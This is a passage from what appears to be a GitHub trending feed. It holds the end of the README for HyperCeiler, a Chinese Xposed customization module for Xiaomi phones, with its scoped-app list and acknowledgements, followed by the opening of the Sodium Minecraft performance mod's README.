&lt;p&gt;提交反馈前请注意是否已有相同反馈，避免给开发者造成困扰。花相同精力看相同反馈是一件很浪费时间的事情。&lt;/p&gt; 
&lt;p&gt;HyperCeiler 已停止维护 Android 11-13 的 MIUI ROM 和 Android 13/14 的 HyperOS 1.0/2.0 ROM。&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Android 11-12 的 MIUI ROM 请使用&lt;a href="https://github.com/ReChronoRain/Cemiuiler/releases/tag/1.3.130"&gt;此版本&lt;/a&gt;。&lt;/p&gt; 
 &lt;p&gt;Android 13 的 MIUI ROM 和 HyperOS 1.0 ROM 请使用&lt;a href="https://github.com/Xposed-Modules-Repo/com.sevtinge.hyperceiler/releases/download/3866-2.5.156_20250118/HyperCeiler_2.5.156_20250118_3866_release_miui.apk"&gt;此版本&lt;/a&gt;。&lt;/p&gt; 
 &lt;p&gt;Android 14 的 HyperOS 1.0/2.0 已归档，从 2.6.162 版本开始将移除对 Android 14 的支持。&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;项目规划&lt;/h2&gt; 
&lt;p&gt;Android 16 预期在 Xiaomi HyperOS 3.0 大部分设备发布后逐渐适配，但因为 Xiaomi HyperOS 的解锁规则，仍有 Root 的设备比起之前会大幅度减少。&lt;/p&gt; 
&lt;p&gt;开发者所拥有的设备也只能勉强适配，不能保证功能都能正常使用，或者也有可能会归档项目，不再进行开发。&lt;/p&gt; 
&lt;h2&gt;作用域包含的应用&lt;/h2&gt; 
&lt;details&gt; 
 &lt;summary&gt;点击展开折叠的内容&lt;/summary&gt; 
 &lt;table&gt; 
  &lt;thead&gt; 
   &lt;tr&gt; 
    &lt;th align="left"&gt;应用名&lt;/th&gt; 
    &lt;th align="left"&gt;包名&lt;/th&gt; 
   &lt;/tr&gt; 
  &lt;/thead&gt; 
  &lt;tbody&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;系统框架&lt;/td&gt; 
    &lt;td align="left"&gt;system&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;系统界面&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.systemui&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;系统桌面&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.home&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;系统更新&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.updater&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;Joyose&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.joyose&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米设置&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.misettings&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;安全服务 (手机管家、平板管家)&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.securitycenter&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;壁纸&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.miwallpaper&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;传送门&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.contentextension&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;弹幕通知&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.barrage&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;电话&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.incallui&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;电话服务&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.phone&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;电量与性能&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.powerkeeper&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;短信&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.mms&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;截屏&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.screenshot&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;日历&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.calendar&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;浏览器&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.browser&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;鲁班（MTB）&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.mtb&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;屏幕录制&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.screenrecorder&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;权限管理服务&lt;/td&gt; 
    &lt;td align="left"&gt;com.lbe.security.miui&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;设置&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.settings&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;搜狗输入法小米版&lt;/td&gt; 
    &lt;td align="left"&gt;com.sohu.inputmethod.sogou.xiaomi&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;天气&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.weather2&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;互联互通服务 (投屏)&lt;/td&gt; 
    &lt;td align="left"&gt;com.milink.service&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;外部存储设备&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.externalstorage&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;息屏与锁屏编辑 (万象息屏)&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.aod&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;文件管理&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.fileexplorer&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;系统服务组件&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.securityadd&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;下载管理&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.providers.downloads.ui&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;下载管理程序&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.providers.downloads&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;相册&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.gallery&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米创作&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.creation&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米互传&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.mishare.connectivity&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米相册-编辑&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.mediaeditor&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米云服务&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.cloudservice&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米智能卡&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.tsmclient&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;讯飞输入法小米版&lt;/td&gt; 
    &lt;td align="left"&gt;com.iflytek.inputmethod.miui&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;应用包管理组件&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.packageinstaller&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;应用商店&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.market&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;智能助理&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.personalassistant&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;主题商店 (主题壁纸、壁纸与个性化)&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.thememanager&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;系统安全组件&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.guardprovider&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;相机&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.camera&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小爱翻译&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.aiasst.vision&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小爱视觉&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.scanner&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;NFC 服务&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.nfc&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;音质音效&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.misound&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;备份&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.backup&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米换机&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.huanji&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;MiTrustService&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.trustservice&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;HTML 查看器&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.htmlviewer&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;通话管理&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.server.telecom&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;万能遥控&lt;/td&gt; 
    &lt;td align="left"&gt;com.duokan.phone.remotecontroller&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;Analytics&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.analytics&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米社区&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.vipaccount&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;语音唤醒&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.voicetrigger&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;录音机&lt;/td&gt; 
    &lt;td align="left"&gt;com.android.soundrecorder&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;LPA&lt;/td&gt; 
    &lt;td align="left"&gt;com.miui.euicc&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td align="left"&gt;小米SIM卡激活服务&lt;/td&gt; 
    &lt;td align="left"&gt;com.xiaomi.simactivate.service&lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt; 
 &lt;/table&gt; 
&lt;/details&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;与 LSPosed 中推荐的作用域相同&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;交流 &amp;amp; 反馈群组&lt;/h2&gt; 
&lt;p&gt;加入我们所创建的群组以反馈问题或是了解最新情况。&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://t.me/cemiuiler_release"&gt;&lt;img src="https://img.shields.io/badge/TG-%E9%A2%91%E9%81%93-4991D3?style=for-the-badge&amp;amp;logo=telegram" alt="badge_trguild" /&gt;&lt;/a&gt; &lt;a href="https://t.me/cemiuiler_canary"&gt;&lt;img src="https://img.shields.io/badge/TGCI-%E9%A2%91%E9%81%93-4991D3?style=for-the-badge&amp;amp;logo=telegram" alt="badge_tcguild" /&gt;&lt;/a&gt; &lt;a href="https://t.me/cemiuiler"&gt;&lt;img src="https://img.shields.io/badge/dynamic/json?style=for-the-badge&amp;amp;color=2CA5E0&amp;amp;label=Telegram&amp;amp;logo=telegram&amp;amp;query=%24.data.totalSubs&amp;amp;url=https%3A%2F%2Fapi.spencerwoo.com%2Fsubstats%2F%3Fsource%3Dtelegram%26queryKey%3Dcemiuiler" alt="badge_telegram" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;为 HyperCeiler 贡献翻译&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://crowdin.com/project/cemiuiler"&gt;&lt;img src="https://badges.crowdin.net/cemiuiler/localized.svg?sanitize=true" alt="Crowdin" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;您可以在&lt;a href="https://crwd.in/cemiuiler"&gt;这里&lt;/a&gt;为 HyperCeiler 项目贡献翻译。&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;注：当新语言翻译进度大于或等于 85% 时，将会进入合并流程，如果已添加的语言，翻译进度小于或等于源文本的 30%，将会暂时被移除，直到重新满足翻译进度大于或等于 85%。&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;感谢&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;HyperCeiler 使用了以下开源项目的部分或全部内容，感谢这些项目的开发者提供的大力支持（排名顺序不分先后）。&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://google.github.io/accompanist"&gt;「Accompanist」 by Android Open Source Project, Google Inc.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://source.android.google.cn/license"&gt;「Android」 by Android Open Source Project, Google Inc.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/LSPosed/AndroidHiddenApiBypass"&gt;「AndroidHiddenApiBypass」 by LSPosed&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/androidx/androidx"&gt;「AndroidX」 by Android Open Source Project, Google Inc.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HChenX/AutoSEffSwitch"&gt;「AutoSEffSwitch」 by HChenX&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/MinaMichita/AntiAntiDefraud"&gt;「AntiAntiDefraud」 by MinaMichita&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/GSWXXN/AutoNFC"&gt;「AutoNFC」 by GSWXXN&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Weverses/BypassSignCheck"&gt;「BypassSignCheck」 by Weverses&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/LSPosed/CorePatch"&gt;「CorePatch」 by LSPosed&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/MonwF/customiuizer"&gt;「CustoMIUIzer」 by MonwF&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/liyafe1997/CustoMIUIzerMod"&gt;「CustoMIUIzerMod」 by liyafe1997&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HChenX/ClipboardList"&gt;「ClipboardList」 by HChenX&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/LuckyPray/DexKit"&gt;「DexKit」 by LuckyPray&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Xposed-Modules-Repo/io.github.tehcneko.applinkverify"&gt;「Disable app link verify」 by tehcneko&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/LSPosed/DisableFlagSecure"&gt;「DisableFlagSecure」 by LSPosed&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/QueallyTech/DisableLogRequest"&gt;「DisableLogRequest」 by QueallyTech&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/KyuubiRan/EzXHelper"&gt;「EzXHelper」 by KyuubiRan&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/qqlittleice/FixMiuiMediaControlPanel"&gt;「FixMiuiMediaControlPanel」 by qqlittleice&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/wuyou-123/FocusNotifLyric"&gt;「FocusNotifLyric」 by wuyou-123&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HChenX/ForegroundPin"&gt;「ForegroundPin」 by HChenX&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/xiaowine/FuckNFC"&gt;「FuckNFC」 by xiaowine&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/google/gson"&gt;「Gson」 by Android Open Source Project, Google Inc.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HowieHChen/XiaomiHelper"&gt;「XiaomiHelper」 by HowieHChen&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/zerorooot/HideMiuiClipboardDialog"&gt;「HideMiuiClipboardDialog」 by zerorooot&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HChenX/HookTool"&gt;「HookTool」 by HChenX&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ghhccghk/HyperFocusApi"&gt;「HyperFocusApi」 by ghhccghk&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/buffcow/HyperSmartCharge"&gt;「HyperSmartCharge」 by buffcow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/YunZiA/HyperStar"&gt;「HyperStar」 by YunZiA&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/JetBrains/kotlin"&gt;「Kotlin」 by JetBrains&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/YifePlayte/MaxFreeForm"&gt;「MaxFreeForm」 by YifePlayte&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/YuKongA/MediaControlOpt"&gt;「MediaControlOpt」 by YuKongA&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/moralnorm/miui_feature"&gt;「MiuiFeature」 by MoralNorm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/qqlittleice/MiuiHome_R"&gt;「MiuiHomeR」 by qqlittleice&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/RC1844/MIUI_IME_Unlock"&gt;「MIUI IME Unlock」 by RC1844&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/chsbuffer/MIUIQOL"&gt;「MIUIQOL」 by chsbuffer&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Wine-Network/Miui_XXL"&gt;「MiuiXXL」 by Wine-Network&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/YuKongA/HyperOS_XXL"&gt;「HyperOSXXL」 by YuKongA&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Xposed-Modules-Repo/io.github.tehcneko.miuinotificationfix"&gt;「MIUI 通知修复」 by tehcneko&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Weverses/ModemPro"&gt;「ModemPro」 by Weverse&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Xposed-Modules-Repo/com.github.dan.nostoragerestrict"&gt;「NoStorageRestrict」 by DanGLES3&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Haocen2004/PortalHook"&gt;「PortalHook」 by Haocen2004&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HChenX/PinningApp"&gt;「PinningApp」 by HChenX&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/gfbjngjibn/RemoveMiuiSystemSelfProtection"&gt;「RemoveMiuiSystemSelfProtection」 by gfbjngjibn&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/weixiansen574/settingsdontthroughthelist"&gt;「SettingsDontThroughTheList」 by weixiansen574&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/hosizoraru/StarVoyager"&gt;「StarVoyager」 by hosizoraru&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/HChenX/SuperLyric"&gt;「SuperLyric」 by HChenX&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ouhoukyo/WINI"&gt;「WINI」 by ouhoukyo&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/YifePlayte/WOMMO"&gt;「WOMMO」 by YifePlayte&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/hosizoraru/WooBoxForMIUI"&gt;「Woobox For MIUI」 by hosizoraru&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Simplicity-Team/WooBoxForMIUI"&gt;「Woobox For MIUI」 by Simplicity-Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/rovo89/XposedBridge"&gt;「Xposed」 by rovo89, Tungstwenty&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/rovo89/XposedBridge"&gt;「XposedBridge」 by rovo89&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Kr328/.xlDownload"&gt;「.xlDownload」 by Kr328&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>CaffeineMC/sodium</title>
      <link>https://github.com/CaffeineMC/sodium</link>
      <description>&lt;p&gt;A Minecraft mod designed to improve frame rates and reduce micro-stutter&lt;/p&gt;&lt;hr&gt;&lt;img src="https://raw.githubusercontent.com/CaffeineMC/sodium/dev/common/src/main/resources/sodium-icon.png" width="128" /&gt; 
&lt;h1&gt;Sodium&lt;/h1&gt; 
&lt;p&gt;Sodium is a powerful rendering engine and optimization mod for the Minecraft client which improves frame rates and reduces micro-stutter, while fixing many graphical issues in Minecraft.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;This mod is the result of thousands of hours of development, and is made possible thanks to players like you.&lt;/strong&gt; If you would like to show a token of your appreciation for my work, and help support the development of Sodium in the process, then consider &lt;a href="https://caffeinemc.net/donate"&gt;buying me a coffee&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://caffeinemc.net/donate"&gt;&lt;img src="https://storage.ko-fi.com/cdn/kofi2.png?v=3" width="180" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;📥 Downloads&lt;/h3&gt; 
&lt;h4&gt;Stable builds&lt;/h4&gt; 
&lt;p&gt;The latest stable release of Sodium can be downloaded from our official &lt;a href="https://modrinth.com/mod/sodium"&gt;Modrinth&lt;/a&gt; and &lt;a href="https://www.curseforge.com/minecraft/mc-mods/sodium"&gt;CurseForge&lt;/a&gt; pages.&lt;/p&gt; 
&lt;h4&gt;Nightly builds (for developers)&lt;/h4&gt; 
&lt;p&gt;We also provide bleeding-edge builds ("nightlies") which are useful for testing the very latest changes before they're packaged into a release. These builds are only provided for other mod developers and users with expert skills, and do not come with any support or warranty. It is often the case they have issues and lack compatibility with other mods.&lt;/p&gt; 
&lt;p&gt;The latest nightly build for each current branch of development can be downloaded below.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Minecraft 1.21.4 (latest): &lt;a href="https://nightly.link/CaffeineMC/sodium/workflows/build-commit/dev/sodium-artifacts-dev.zip"&gt;Download nightly&lt;/a&gt; or &lt;a href="https://github.com/CaffeineMC/sodium/actions/workflows/build-commit.yml?query=branch%3Adev"&gt;View all builds&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Minecraft 1.21.3: &lt;a href="https://nightly.link/CaffeineMC/sodium/workflows/build-commit/1.21.3%2Fstable/sodium-artifacts-1.21.3-stable.zip"&gt;Download nightly&lt;/a&gt; or &lt;a href="https://github.com/CaffeineMC/sodium/actions/workflows/build-commit.yml?query=branch%3A1.21.3%2Fstable"&gt;View all builds&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Minecraft 1.21.1: &lt;a href="https://nightly.link/CaffeineMC/sodium/workflows/build-commit/1.21.1%2Fstable/sodium-artifacts-1.21.1-stable.zip"&gt;Download nightly&lt;/a&gt; or &lt;a href="https://github.com/CaffeineMC/sodium/actions/workflows/build-commit.yml?query=branch%3A1.21.1%2Fstable"&gt;View all builds&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;🖥️ Installation&lt;/h3&gt; 
&lt;p&gt;Since the release of Sodium 0.6.0, both the &lt;em&gt;Fabric&lt;/em&gt; and &lt;em&gt;NeoForge&lt;/em&gt; mod loaders are supported. We generally recommend that new users prefer to use the &lt;em&gt;Fabric&lt;/em&gt; mod loader, since it is more lightweight and stable (for the time being.)&lt;/p&gt; 
&lt;p&gt;For more information about downloading and installing the mod, please refer to our &lt;a href="https://github.com/CaffeineMC/sodium/wiki/Installation"&gt;Installation Guide&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;🙇 Getting Help&lt;/h3&gt; 
&lt;p&gt;For technical support (including help with mod installation problems and game crashes), please use our &lt;a href="https://caffeinemc.net/discord"&gt;official Discord server&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;📬 Reporting Issues&lt;/h3&gt; 
&lt;p&gt;If you do not need technical support and would like to report an issue (bug, crash, etc.) or otherwise request changes (for mod compatibility, new features, etc.), then we encourage you to open an issue on the &lt;a href="https://github.com/CaffeineMC/sodium/issues"&gt;project issue tracker&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Please note that while the issue tracker is open to feature requests, development is primarily focused on improving compatibility, performance, and finishing any unimplemented features necessary for parity with the vanilla renderer.&lt;/p&gt; 
&lt;h3&gt;💬 Join the Community&lt;/h3&gt; 
&lt;p&gt;We have an &lt;a href="https://caffeinemc.net/discord"&gt;official Discord community&lt;/a&gt; for all of our projects. By joining, you can:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Get installation help and technical support for all of our mods&lt;/li&gt; 
 &lt;li&gt;Get the latest updates about development and community events&lt;/li&gt; 
 &lt;li&gt;Talk with and collaborate with the rest of our team&lt;/li&gt; 
 &lt;li&gt;... and just hang out with the rest of our community.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;✅ Hardware Compatibility&lt;/h2&gt; 
&lt;p&gt;We only provide official support for graphics cards which have up-to-date drivers that are compatible with OpenGL 4.5 or newer. Most graphics cards released in the past 12 years will meet these requirements, including the following:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;AMD Radeon HD 7000 Series (GCN 1) or newer&lt;/li&gt; 
 &lt;li&gt;NVIDIA GeForce 400 Series (Fermi) or newer&lt;/li&gt; 
 &lt;li&gt;Intel HD Graphics 500 Series (Skylake) or newer&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Nearly all graphics cards that are already compatible with Minecraft (which requires OpenGL 3.3) should also work with Sodium. But our team cannot ensure compatibility or provide support for older graphics cards, and they may not work with future versions of Sodium.&lt;/p&gt; 
&lt;h4&gt;OpenGL Compatibility Layers&lt;/h4&gt; 
